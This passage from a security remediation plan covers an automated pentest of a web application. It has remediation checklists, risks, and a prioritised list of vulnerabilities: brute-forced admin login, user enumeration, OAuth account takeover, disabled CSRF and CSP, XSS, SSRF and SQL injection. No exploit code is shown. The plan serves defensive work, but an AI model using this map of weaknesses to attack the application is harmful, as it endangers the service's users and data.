- [ ] Security test suite runs in CI/CD pipeline
- [ ] Zero critical security findings in follow-up scan

---

## Dependencies & Risks

**Dependencies:**
- `lockbox` or Rails encryption for credential encryption
- `dompurify` npm package for DOM-based XSS prevention
- `rack-attack` already installed for rate limiting

**Risks:**
- **Breaking changes:** Sanitization may break legitimate HTML in landing pages (test thoroughly)
- **Performance:** URL validation adds latency to external requests (acceptable trade-off)
- **User impact:** OAuth users may need to re-authenticate after account linking fix

**Mitigation:**
- Staged rollout with feature flags
- Comprehensive testing in staging environment
- User communication for OAuth changes
- Monitoring for false positives in SSRF blocking

---

## Post-Remediation

**Follow-up Actions:**
- [ ] Re-run Shannon pentest to verify fixes (est. $70-100)
- [ ] Implement automated security testing in CI/CD
- [ ] Schedule quarterly security audits
- [ ] Create security runbook for incident response
- [ ] Train team on secure coding practices

**Documentation:**
- [ ] Update security guidelines in `docs/SECURITY_GUIDE.md`
- [ ] Document sanitization patterns for future development
- [ ] Create OAuth integration security checklist
- [ ] Add SSRF prevention guidelines to coding standards

---

**Epic Owner:** Security Team
**Stakeholders:** Engineering, Product, InfoSec
**Review Date:** After Phase 3 completion
**Next Pentest:** Q2 2026

---

## Quick Reference: Vulnerability Summary

### ⚠️ **ACTIVELY EXPLOITED** (Fix Within 24-48 Hours)

**6 vulnerabilities successfully exploited with proof-of-concept:**

1. **API Brute Force (CRITICAL)** - Admin account cracked at 90 attempts/minute
2. **User Enumeration (HIGH)** - Valid emails extracted (admin@demo.com, marketer@demo.com)
3. **Weak Password Policy (HIGH)** - Accepts "aaaaaaaaaa", password spraying enabled
4. **Infinite API Key Validity (CRITICAL)** - Stolen keys = permanent access
5. **Missing Cache-Control (HIGH)** - Credentials cached on shared devices
6. **Password Reset Flooding (MEDIUM)** - 50 emails in 2.5 seconds

**New Critical Discoveries:**
- **CSRF Protection DISABLED** in production
- **AWS SES Webhooks** have NO signature verification
- **PostgreSQL** has no Row-Level Security (multi-tenant gap)
- **Rack::Attack** uses MemoryStore (multi-container bypass)

---

### 🔴 **Critical** (Fix Within 1 Week)

**Confirmed by Code Analysis:**
- **Session Fixation** - Session IDs don't rotate after login
- **OAuth Account Takeover** - Auto-links without password verification
- **CSP Disabled** - All XSS executes unrestricted
- **Plaintext API Keys** - Not using encrypted column
- **TOTP Secrets Plaintext** - MFA secrets exposed in DB
- **13 XSS Vulnerabilities** - Stored and DOM-based (blocked from exploitation by app errors)

---

### 🟠 **High** (Fix Within 2 Weeks)

- **4 Authorization Flaws** - Horizontal IDOR, vertical privilege escalation (blocked from exploitation by app errors)
- **7 SSRF Vulnerabilities** - AWS metadata theft, file:// protocol (blocked by auth failures)
- **No Rate Limiting** on password reset endpoint

---

### 🟡 **Medium** (Fix Within 4 Weeks)

- **SQL Injection** - 1 instance in admin controller (ORDER BY, requires admin auth)
- **No Row-Level Security** in PostgreSQL (defense-in-depth)
- **Rack::Attack MemoryStore** (distributed deployment vulnerability)

---

### ✅ **Good Security Practices** (Keep Maintaining)

- **512+ files** use parameterized SQL queries ✓
- **Password hashing** with BCrypt (cost factor 12) ✓
- **MFA implementation** with proper rate limiting ✓
- **Webhook signature verification** for Stripe, GitHub, Shopify ✓
- **Strong password minimum** (10 characters - increase to 12) ✓

---

## Final Shannon Scan Metrics

**Scan Completed:** February 12, 2026 at 2:32 AM
**Duration:** 4 hours 17 minutes
**Total Cost:** $86.25
**Agents Completed:** 12/13

**Vulnerabilities Found:**
- ✅ Exploited: 6
- 🔍 Confirmed: 32
- 📋 Total: 38+

**Exploitation Success Rate:**
- Authentication: 6/8 exploited (75%)
- XSS: 0/13 exploited (blocked by app instability)
- Authorization: 0/4 exploited (blocked by app errors)
- SSRF: 0/7 exploited (blocked by auth failures)
- SQL Injection: 0/1 (admin-only, not tested)

**Deliverables Generated:**
- Comprehensive Security Assessment Report (58KB)
- Authentication Exploitation Evidence (37KB)
- XSS Exploitation Evidence (35KB)
- SSRF Exploitation Evidence (27KB)
- Authorization Exploitation Evidence (19KB)
- Full analysis reports for each vulnerability category
